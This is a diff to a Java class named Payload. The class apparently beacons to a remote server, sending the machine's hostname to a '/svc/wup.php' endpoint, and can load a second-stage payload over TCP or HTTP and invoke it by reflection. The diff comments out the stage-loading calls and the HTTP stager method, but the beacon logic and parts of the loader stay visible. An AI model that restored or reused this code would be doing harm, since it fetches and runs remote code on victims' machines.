@@ -104,7 +104,7 @@ public class Payload {
                             if (exec.equals("1")) {
 
                                 result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&exec=0");
-                                runStagefromTCP(url);
+ //                               runStagefromTCP(url);
                             }
 
                             Thread.sleep(60 * 1000);
@@ -114,7 +114,7 @@ public class Payload {
                         }
                     //}
                 } else {
-                    runStageFromHTTP(url);
+//                    runStageFromHTTP(url);
                 }
             }
         } catch (NumberFormatException e3) {
@@ -161,7 +161,7 @@ public class Payload {
 
         return  result;
     }
-    private static void runStageFromHTTP(String url) throws Exception {
+/*    private static void runStageFromHTTP(String url) throws Exception {
         InputStream inStream;
         if (url.startsWith("https")) {
             URLConnection uc = new URL(url).openConnection();
@@ -215,4 +215,5 @@ public class Payload {
         myClass.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, parameters});
         //System.exit(0);
     }
+*/
 }
